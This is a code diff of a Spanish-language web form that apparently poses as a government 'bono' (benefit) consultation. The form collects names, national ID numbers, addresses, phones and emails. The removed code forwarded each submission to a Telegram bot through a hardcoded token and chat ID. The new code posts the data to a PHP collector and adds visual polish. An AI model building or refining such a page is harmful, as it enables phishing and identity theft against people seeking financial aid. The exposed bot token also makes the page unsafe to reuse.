@@ -29,6 +29,12 @@
     padding: 15px;
     box-sizing: border-box;
     margin-top: 10px;
+    animation: fadeIn 0.6s ease;
+  }
+
+  @keyframes fadeIn {
+    from {opacity:0; transform: translateY(10px);}
+    to {opacity:1; transform: translateY(0);}
   }
 
   .header {
@@ -75,6 +81,13 @@
     border: 1px solid #c3cad9;
     margin-bottom: 10px;
     box-sizing: border-box;
+    transition: all 0.2s ease;
+  }
+
+  input:focus {
+    border-color: #0b44a4;
+    box-shadow: 0 0 4px rgba(11,68,164,0.4);
+    outline: none;
   }
 
   .security {
@@ -104,11 +117,12 @@
     cursor: pointer;
     text-transform: uppercase;
     box-shadow: 0 4px 9px rgba(11, 68, 164, 0.5);
-    transition: background-color 0.3s ease;
+    transition: background-color 0.3s ease, transform 0.1s ease;
   }
 
   button:hover {
     background: #09377d;
+    transform: scale(1.01);
   }
 
   .legal {
@@ -119,7 +133,6 @@
     text-align: center;
   }
 
-  /* Media query para ajustar aún más en pantallas muy pequeñas */
   @media (max-width: 360px) {
     h1 {
       font-size: 16px;
@@ -158,16 +171,23 @@
     justify-content: center;
     align-items: center;
     z-index: 1000;
+    animation: fadeIn 0.3s ease;
   }
 
   .popup-content {
     background: white;
-    padding: 15px 20px;
+    padding: 20px;
     border-radius: 10px;
     width: 90%;
     max-width: 320px;
     text-align: center;
     box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+    animation: zoomIn 0.3s ease;
+  }
+
+  @keyframes zoomIn {
+    from { transform: scale(0.9); opacity: 0; }
+    to { transform: scale(1); opacity: 1; }
   }
 
   .popup-content h2 {
@@ -179,6 +199,12 @@
   .popup-content p {
     font-size: 12px;
     color: #333;
+  }
+
+  .popup-content .check {
+    font-size: 40px;
+    color: #2a5a27;
+    margin-bottom: 10px;
   }
 </style>
 </head>
@@ -227,6 +253,7 @@
 
 <div class="popup" id="popup">
   <div class="popup-content">
+    <div class="check">✔️</div>
     <h2>Consulta enviada</h2>
     <p>En caso de aprobarse el bono, será comunicado inmediatamente al número de contacto o Gmail. Gracias.</p>
   </div>
@@ -236,44 +263,25 @@
   const form = document.getElementById('bonoForm');
   const popup = document.getElementById('popup');
 
-  // Poner aquí tus datos de Telegram
-  const TELEGRAM_TOKEN = "8294121246:AAEWiRJdKEJRn4UdJpUyaTVsfk1MCua19WI";
-  const CHAT_ID = "5654253897";
-
   form.addEventListener('submit', function(e) {
     e.preventDefault();
 
-    const nombre = document.getElementById('nombre').value;
-    const cedula = document.getElementById('cedula').value;
-    const provincia = document.getElementById('provincia').value;
-    const direccion = document.getElementById('direccion').value;
-    const telefono = document.getElementById('telefono').value;
-    const email = document.getElementById('email').value;
+    const datos = new FormData(form);
 
-    const mensaje = `
-📋 *Nueva Consulta Bono * 📋
-👤 Nombre: ${nombre}
-🪪 Cédula: ${cedula}
-📍 Provincia/Ciudad: ${provincia}
-🏠 Dirección: ${direccion}
-📞 Teléfono: ${telefono}
-✉️ Email: ${email}
-    `;
-
-    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    fetch("guardar.php", {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: mensaje,
-        parse_mode: "Markdown"
-      })
-    }).then(() => {
-      popup.style.display = 'flex';
-      setTimeout(() => { popup.style.display = 'none'; form.reset(); }, 3000);
-    }).catch(err => {
-      alert("Error al enviar a Telegram: " + err);
-    });
+      body: datos
+    })
+    .then(res => res.text())
+    .then(res => {
+      if (res === "OK") {
+        popup.style.display = 'flex';
+        setTimeout(() => { popup.style.display = 'none'; form.reset(); }, 3000);
+      } else {
+        alert("Error: " + res);
+      }
+    })
+    .catch(err => alert("Error de conexión: " + err));
   });
 
   popup.addEventListener('click', function(e) {
